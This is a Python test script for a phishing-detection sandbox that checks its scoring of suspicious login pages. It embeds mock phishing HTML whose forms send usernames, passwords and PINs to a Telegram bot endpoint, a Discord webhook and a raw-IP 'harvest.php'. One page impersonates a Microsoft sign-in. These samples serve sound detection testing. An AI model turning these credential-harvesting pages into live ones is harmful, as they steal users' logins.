import os
import sys
import tempfile
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core_engine.sandbox_engine import VirtualSandboxAnalyzer
from core_engine.ml_engine import MultiModalFusionEngine

def test_upgraded_sandbox():
    print("=" * 80)
    print("🧪 TESTING UPGRADED TRUSTSHIELD V2 SANDBOX ENGINE")
    print("=" * 80)
    
    analyzer = VirtualSandboxAnalyzer()
    
    # ----------------------------------------------------
    # Test 1: Anti-Bot Stealth & Standard Output Verification
    # ----------------------------------------------------
    print("\n[Test 1] Testing Stealth Navigation & Standardized Output Schema...")
    res = analyzer.analyze_link_in_sandbox("https://example.com")
    
    required_keys = [
        "sandbox_has_password_field", "external_form_action", "suspicious_exfiltration",
        "domain_age_days", "newly_registered_domain", "domain_risk_score",
        "sandbox_num_redirects", "sandbox_hidden_iframes", "sandbox_title_mismatch",
        "sandbox_unreachable", "sandbox_threat_score"
    ]
    
    for key in required_keys:
        assert key in res, f"Missing key in sandbox output: {key}"
    print(f"✅ Schema verified! Keys present: {list(res.keys())}")
    print(f"   Domain Age for example.com: {res['domain_age_days']} days (newly_registered: {res['newly_registered_domain']})")
    
    # ----------------------------------------------------
    # Test 2: Form Exfiltration Destination Inspection
    # ----------------------------------------------------
    print("\n[Test 2] Testing Form Exfiltration to Malicious Endpoint (Telegram API)...")
    mock_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Account Verification</title></head>
    <body>
        <h2>Verify Your Login</h2>
        <form action="https://api.telegram.org/bot12345/sendMessage" method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Submit</button>
        </form>
    </body>
    </html>
    """
    with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w", encoding="utf-8") as f:
        f.write(mock_html)
        temp_path = f.name
        
    try:
        mock_file_url = f"file:///{temp_path.replace(os.sep, '/')}"
        exfil_res = analyzer.analyze_link_in_sandbox(mock_file_url)
        
        print(f"   Has Password Field: {exfil_res['sandbox_has_password_field']}")
        print(f"   External Form Action: {exfil_res['external_form_action']}")
        print(f"   Suspicious Exfiltration: {exfil_res['suspicious_exfiltration']}")
        print(f"   Sandbox Threat Score: {exfil_res['sandbox_threat_score']}")
        
        assert exfil_res['sandbox_has_password_field'] == 1, "Failed to detect password field!"
        assert exfil_res['suspicious_exfiltration'] == 1, "Failed to detect Telegram webhook exfiltration!"
        print("✅ Form Exfiltration correctly flagged!")
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

    # ----------------------------------------------------
    # Test 3: Full End-to-End MultiModal Pipeline Verification
    # ----------------------------------------------------
    print("\n[Test 3] Testing Full MultiModal Pipeline with Exfiltration Attack...")
    fusion = MultiModalFusionEngine()
    attack_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Urgent Bank Login</title></head>
    <body>
        <form action="https://discord.com/api/webhooks/123456/token" method="POST">
            <input type="password" name="pin" placeholder="Enter Bank PIN">
        </form>
    </body>
    </html>
    """
    with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w", encoding="utf-8") as f:
        f.write(attack_html)
        attack_file = f.name
        
    try:
        attack_url = f"file:///{attack_file.replace(os.sep, '/')}"
        pipeline_res = fusion.analyze_email_comprehensive(
            subject="URGENT: Verify your account immediately",
            body="Your account will be suspended. Click below to verify.",
            extracted_links=[attack_url]
        )
        print(f"   Pipeline Verdict: {pipeline_res['verdict']}")
        print(f"   Final Threat Score: {pipeline_res['final_threat_score']}")
        print(f"   Meta Details: {pipeline_res['meta_classifier_details']['meta_features_used']}")
        assert pipeline_res['verdict'] == "CRITICAL FRAUD / PHISHING", f"Expected CRITICAL FRAUD, got {pipeline_res['verdict']}"
        assert pipeline_res['final_threat_score'] >= 90.0, f"Expected threat score >= 90, got {pipeline_res['final_threat_score']}"
        print("✅ Full Pipeline correctly flagged zero-day exfiltration attack!")
    finally:
        if os.path.exists(attack_file):
            os.remove(attack_file)

    # ----------------------------------------------------
    # Test 4: Step 4 Brand Impersonation Detection
    # ----------------------------------------------------
    print("\n[Test 4] Testing Brand Impersonation Detection (Microsoft Login on Unauthorized Domain)...")
    ms_impersonate_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in to your Microsoft account</title>
        <meta property="og:title" content="Microsoft Office 365 Login">
        <meta property="og:site_name" content="Microsoft Online">
    </head>
    <body>
        <h2>Microsoft Account Verification</h2>
        <form action="/login_post.php" method="POST">
            <input type="email" name="loginfmt" placeholder="someone@example.com">
            <input type="password" name="passwd" placeholder="Password">
            <button type="submit">Sign In</button>
        </form>
    </body>
    </html>
    """
    with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w", encoding="utf-8") as f:
        f.write(ms_impersonate_html)
        ms_file = f.name

    try:
        ms_url = f"file:///{ms_file.replace(os.sep, '/')}"
        brand_res = analyzer.analyze_link_in_sandbox(ms_url)
        print(f"   Brand Impersonation Flag: {brand_res['brand_impersonation']}")
        print(f"   Impersonated Brand: {brand_res['impersonated_brand']}")
        print(f"   Sandbox Brand Impersonation: {brand_res['sandbox_brand_impersonation']}")
        print(f"   Sandbox Threat Score: {brand_res['sandbox_threat_score']}")
        
        assert brand_res['brand_impersonation'] == 1, "Failed to detect Microsoft brand impersonation!"
        assert brand_res['impersonated_brand'] == "microsoft", f"Expected 'microsoft', got {brand_res['impersonated_brand']}"
        assert brand_res['sandbox_threat_score'] >= 80, f"Expected threat score >= 80, got {brand_res['sandbox_threat_score']}"
        print("✅ Brand Impersonation successfully detected and penalized (+50 pts)!")
    finally:
        if os.path.exists(ms_file):
            os.remove(ms_file)

    # ----------------------------------------------------
    # Test 5: Fallback Safety Net for Obscure Brand (Not in Catalog)
    # ----------------------------------------------------
    print("\n[Test 5] Testing Fallback Safety Net for Obscure Brand / Custom Portal...")
    obscure_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>City Regional Library Member Portal</title>
    </head>
    <body>
        <h2>Login to Access Digital Archives</h2>
        <form action="http://185.220.101.5/harvest.php" method="POST">
            <input type="text" name="student_id">
            <input type="password" name="library_pin">
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """
    with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w", encoding="utf-8") as f:
        f.write(obscure_html)
        obscure_file = f.name

    try:
        obscure_url = f"file:///{obscure_file.replace(os.sep, '/')}"
        fallback_res = analyzer.analyze_link_in_sandbox(obscure_url)
        print(f"   Brand Impersonation Flag: {fallback_res['brand_impersonation']} (Quiet pass as expected)")
        print(f"   Has Password Field: {fallback_res['sandbox_has_password_field']}")
        print(f"   Suspicious Exfiltration (Raw IP): {fallback_res['suspicious_exfiltration']}")
        print(f"   Sandbox Threat Score: {fallback_res['sandbox_threat_score']}")
        
        assert fallback_res['brand_impersonation'] == 0, "Obscure brand should not falsely match catalog!"
        assert fallback_res['sandbox_has_password_field'] == 1, "Failed to detect password field!"
        assert fallback_res['suspicious_exfiltration'] == 1, "Failed to catch raw IP exfiltration!"
        assert fallback_res['sandbox_threat_score'] >= 80, f"Safety net failed to reach critical score: {fallback_res['sandbox_threat_score']}"
        print("✅ Fallback safety net successfully caught zero-day attack on uncataloged portal!")
    finally:
        if os.path.exists(obscure_file):
            os.remove(obscure_file)
            
    print("\n" + "=" * 80)
    print("🎉 ALL PROCEDURES (INCLUDING STEP 4 & FALLBACK NET) TESTED AND PASSED!")
    print("=" * 80)

if __name__ == "__main__":
    test_upgraded_sandbox()
